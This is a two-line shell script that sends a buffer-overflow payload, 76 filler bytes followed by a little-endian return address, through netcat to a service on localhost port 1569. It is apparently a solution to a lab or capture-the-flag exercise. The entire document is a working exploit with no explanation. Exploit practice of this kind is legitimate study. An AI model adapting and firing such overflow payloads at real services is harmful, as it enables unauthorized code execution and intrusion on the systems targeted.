#!/bin/sh

python -c 'print "A"*76 + "\x39\x1b\x00\x00"' | nc localhost 1569
